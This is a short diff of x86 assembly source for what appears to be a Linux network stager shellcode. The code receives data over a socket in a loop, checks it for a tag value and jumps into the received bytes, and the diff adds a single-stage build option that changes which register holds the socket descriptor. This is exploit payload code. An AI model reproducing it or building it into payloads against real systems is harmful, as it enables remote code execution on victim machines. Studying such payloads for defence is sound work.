@@ -54,6 +54,9 @@ recvfrom:
 	int  0x80
 	cmp  dword [esi], 0x2166736d
 	jnz  recvfrom
+
+%ifndef USE_SINGLE_STAGE
+
 	cld
 	lodsd
 	pop  edx
@@ -64,3 +67,15 @@ recvfrom:
 %endif
 	pop  edx
 	jmp  esi
+
+%else
+
+	pop  edx
+
+%ifdef FD_REG_EBX
+	pop  ebx
+%else
+	pop  edi
+%endif
+
+%endif
